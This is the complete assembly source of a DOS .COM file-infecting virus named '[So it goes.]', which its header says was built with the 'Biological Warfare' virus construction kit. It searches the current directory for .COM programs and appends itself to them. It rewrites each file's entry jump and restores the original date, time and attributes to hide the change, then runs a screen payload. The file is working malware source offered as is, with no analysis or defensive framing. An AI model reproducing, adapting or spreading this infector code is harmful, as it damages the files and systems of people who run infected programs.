; soitgoes.asm : [So it goes.]
; Created with Biological Warfare - Version 0.90á by MnemoniX

PING            equ     0AC3Ch
INFECT          equ     1

code            segment
                org     100h
                assume  cs:code,ds:code

start:
                db      0E9h,3,0          ; to virus
host:
                db      0CDh,20h,0        ; host program
virus_begin:
                push    ds es

                call    $ + 3             ; BP is instruction ptr.
                pop     bp
                sub     bp,offset $ - 1

                lea     dx,[bp + offset new_DTA]
                mov     ah,1Ah
                int     21h

                mov     byte ptr [bp + infections],0

                call    infect_dir

                call    activate

                pop     es ds
                mov     dx,80h
                mov     ah,1Ah
                int     21h

com_exit:
                lea     si,[bp + host]          ; restore host program
                mov     di,100h
                push    di
                movsw
                movsb

                call    fix_regs                ; fix up registers
                ret                             ; and leave

fix_regs:
                xor     ax,ax
                cwd
                xor     bx,bx
                mov     si,100h
                xor     di,di
                xor     bp,bp
                ret


infect_dir:
                mov     ah,4Eh
                lea     dx,[bp + find_me]
                int     21h
                jc      infect_done

next_file:
                lea     dx,[bp + new_DTA + 1Eh]
                call    execute
                cmp     byte ptr [bp + infections],INFECT
                je      infect_done
                mov     ah,4Fh
                int     21h
                jnc     next_file

infect_done:
                ret
execute:
                push    si

                mov     ax,4300h                ; change attributes
                int     21h

                push    cx dx ds
                xor     cx,cx
                call    set_attributes

                mov     ax,3D02h                ; open file
                int     21h
                jc      cant_open
                xchg    bx,ax

                mov     ax,5700h                ; save file date/time
                int     21h
                push    cx dx
                mov     ah,3Fh
                mov     cx,28
                lea     dx,[bp + read_buffer]
                int     21h

                cmp     word ptr [bp + read_buffer],'ZM'
                je      dont_infect             ; .EXE, skip

                mov     al,2                    ; move to end of file
                call    move_file_ptr

                sub     dx,VIRUS_SIZE + 3       ; check for previous infection
                cmp     dx,word ptr [bp + read_buffer + 1]
                je      dont_infect

                add     dx,VIRUS_SIZE + 3
                mov     word ptr [bp + new_jump + 1],dx

                lea     dx,[bp + read_buffer]   ; save original program head
                int     21h

                mov     ah,40h                  ; write virus to file
                mov     cx,VIRUS_SIZE
                lea     dx,[bp + virus_begin]
                int     21h

                xor     al,al                   ; back to beginning of file
                call    move_file_ptr

                lea     dx,[bp + new_jump]
                int     21h

fix_date_time:
                pop     dx cx
                mov     ax,5701h                ; restore file date/time
                int     21h

                inc     byte ptr [bp + infections]

close:
                pop     ds dx cx                ; restore attributes
                call    set_attributes

                mov     ah,3Eh                  ; close file
                int     21h

cant_open:
                pop     si
                ret


set_attributes:
                mov     ax,4301h
                int     21h
                ret

dont_infect:
                pop     cx dx                   ; can't infect, skip
                jmp     close

move_file_ptr:
                mov     ah,42h                  ; move file pointer
                cwd
                xor     cx,cx
                int     21h

                mov     dx,ax                   ; set up registers
                mov     ah,40h
                mov     cx,3
                ret

activate:                                       ; Insert your routine here
                MOV     CX,03h
                MOV     AH,09h
                MOV     BH,00h
                MOV     CX,03h
                MOV     AL,00h
                MOV     BL,23
                INT     10h
                ret

signature       db      '[So it goes.]',0


find_me         db      '*.COM',0
new_jump        db      0E9h,0,0

infections      db      0
virus_end:
VIRUS_SIZE      equ     virus_end - virus_begin
read_buffer     db      28 dup (?)              ; read buffer
new_DTA         db      128 dup(?)

end_heap:

MEM_SIZE        equ     end_heap - start

code            ends
                end     start
